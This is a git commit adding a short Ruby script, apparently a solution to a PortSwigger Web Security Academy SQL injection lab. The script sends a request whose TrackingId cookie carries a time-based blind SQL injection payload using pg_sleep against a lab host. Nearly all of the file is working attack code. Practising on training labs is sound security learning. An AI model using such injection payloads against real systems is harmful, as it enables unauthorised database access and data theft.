7a1932ab1afb156aef407d15a8b131bace5967e1
A3h1nt <56585189+A3h1nt@users.noreply.github.com>
2025-04-14 17:46:19 +0530

    Create sql-14.rb

---
+++ SQL/sql-14.rb
@@ -0,0 +1,3 @@
+require 'http';client=HTTP.cookies(:session=>"teVWk7g7nn96nWVFYeTgIEgIwCz2Sb3",:TrackingId=>"fmSIC90KRvehZKSJ' || pg_sleep(10)-- -").get "https://0a8600d103c78a8d806d7bd1001a0096.web-security-academy.net/"; puts client.status
+
+
